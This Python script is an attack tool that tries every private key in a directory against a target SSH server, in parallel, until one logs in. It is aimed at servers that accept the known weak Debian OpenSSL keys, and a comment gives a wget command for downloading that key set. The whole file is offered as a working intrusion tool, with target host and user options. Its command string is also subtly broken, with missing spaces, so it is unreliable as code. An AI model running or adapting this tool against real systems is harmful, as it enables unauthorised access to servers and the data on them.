#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
Created on Tue May  8 19:00:59 2018

@author: starboy
"""

# Exploit ssh if it has weak private keys
# We will need to generate keys and store the keyfiles in a directory
# the program takes the directory as input

# wget http://digitaloffense.net/tools/debian-openssl/debian_ssh_dsa_1024_x86.tar.bz2
# We can download or generate SHA keys as well.
import os
import optparse
import pexpect
from threading import *


max_connections = 5
connection_lock = BoundedSemaphore(value = max_connections)

Stop = False
Fails = 0

# Function that makes the connection and tests the keys
def connect(host, user, file_path, release):
    global Stop
    global Fails
    
    try:
        perm_denied = 'Permission denied'
        ssh_newkey = 'Are you sure you want to continue'
        conn_closed = 'Connection closed by remote host'
        
        opt = ' -o PasswordAuthentication=no'
        conn_str = 'ssh'+user+'@'+host+' -i'+file_path+opt
        
        child = pexpect.spawn(conn_str)
        
        # comma after hash is intentional
        ret = child.expect([pexpect.TIMEOUT, perm_denied, ssh_newkey, conn_closed, '$', '#', ])

        if ret == 2:
            print('[+] Adding host to ~/.ssh/known_hosts')
            child.sendline('yes')
            connect(host,user,file_path,False)
        elif ret == 3:
            print('[-]Connection closed by remote host')
            Fails += 1
        elif ret > 3:
            print('[+] Success.'+str(file_path))
            Stop = True
    finally:
        if release:
            connection_lock.release()


# Option parsing
parser = optparse.OptionParser('Usage:: -H <target host> -u <user> -d <directory>')
parser.add_option('-H', dest='t_host', type='string', help='enter target host')
parser.add_option('-u', dest='username', type='string', help='enter the username')
parser.add_option('-d', dest='directory', type='string', help='enter the directory with keys')

(options, args) = parser.parse_args()
host = options.t_host
directory = options.directory
user = options.username


# Check if parameters entered are empty
if (host == None) or (directory == None) or (user == None):
    print(parser.usage)
    exit(0)
    
for file in os.listdir(directory):
    if Stop:
        print('[+] Exiting key found')
        exit(0)

    if Fails > 5:
        print('[!] Exiting. Too many connections closed by remote host')
        print('[!] Adjust number of simultaneous threads')
        exit(0)
        
    connection_lock.acquire()
    
    full_path = os.path.join(directory, file)
    
    print('[+] Testing key-file :' + file)
    
    t = Thread(target = connect, args =(host, user, full_path, True))
    child = t.start()
    
    
    
        
        